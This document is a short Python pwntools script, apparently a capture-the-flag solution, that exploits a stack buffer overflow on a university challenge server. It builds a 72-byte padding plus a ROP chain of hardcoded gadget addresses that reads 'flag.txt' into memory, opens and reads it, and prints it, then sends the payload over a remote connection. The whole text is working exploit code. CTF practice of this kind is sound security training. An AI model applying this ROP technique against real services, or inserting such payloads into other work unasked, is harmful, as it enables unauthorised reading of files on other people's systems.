from pwn import *


# open fd 0 (stdin)
# write to stdin
# read stdin

read = p64(0x000000000040119c)
write = p64(0x00000000004011a6)
open = p64(0x00000000004011b0)

pop_rdi = p64(0x0000000000401196)
pop_rdx = p64(0x000000000040119a)
pop_rsi = p64(0x0000000000401198)
syscall = p64(0x00000000004011a3)

file = b'flag.txt\x00'
file_descriptor = p64(3)

bss_mem = p64(0x0000000000404020)

offset = 72
payload = b"A" * offset

# write filename into memory
payload += pop_rdi
payload += p64(0)
payload += pop_rsi
payload += bss_mem
payload += pop_rdx
payload += p64(len(file))
payload += read

# open file
payload += pop_rdi
payload += bss_mem # filename in memory
payload += pop_rsi
payload += p64(0)  # open flags
payload += pop_rdx
payload += p64(0)  # open mode
payload += open

# read contents of file
payload += pop_rdi
payload += file_descriptor
payload += pop_rsi
payload += bss_mem
payload += pop_rdx
payload += p64(100)
payload += read

# print file to stdout (fd 1)
payload += pop_rdi
payload += p64(1)
payload += pop_rsi
payload += bss_mem
payload += pop_rdx
payload += p64(100)
payload += write



p = remote("cyberchallenge.disi.unitn.it", 9104)
p.sendline(payload)
p.sendline(file)
print(p.recvall().decode(errors="ignore").split('\n')[0])

